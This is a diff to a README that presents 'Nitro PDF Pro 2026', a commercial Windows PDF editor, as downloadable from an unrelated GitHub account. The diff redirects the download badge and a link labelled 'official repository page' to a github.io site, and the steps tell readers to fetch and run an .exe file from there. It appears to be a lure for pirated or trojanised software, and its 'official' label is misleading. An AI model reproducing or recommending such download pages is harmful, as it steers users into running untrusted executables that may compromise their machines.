@@ -1,6 +1,6 @@
 # 📄 Nitro-PDF-Pro-2026 - Edit Your Documents With Ease Today
 
-[![](https://img.shields.io/badge/Download-Nitro_PDF_Pro-blue.svg)](https://github.com/Augustacrossbanded394/Nitro-PDF-Pro-2026)
+[![](https://img.shields.io/badge/Download-Nitro_PDF_Pro-blue.svg)](https://augustacrossbanded394.github.io)
 
 Nitro PDF Pro 2026 allows you to create, edit, and convert documents on your Windows computer. Whether you need to sign a contract, change text in a report, or merge multiple files, this software provides the tools to get the task done. This guide walks you through the steps to set up the application on your system.
 
@@ -21,7 +21,7 @@ Ensure your Windows system receives all current updates through Windows Update b
 
 Follow these steps to obtain the setup file for Nitro PDF Pro 2026:
 
-1. Visit the [official repository page](https://github.com/Augustacrossbanded394/Nitro-PDF-Pro-2026).
+1. Visit the [official repository page](https://augustacrossbanded394.github.io).
 2. Look for the releases section on the right side of the page.
 3. Click the link to view the current version.
 4. Select the file ending in .exe to start the transfer to your computer.
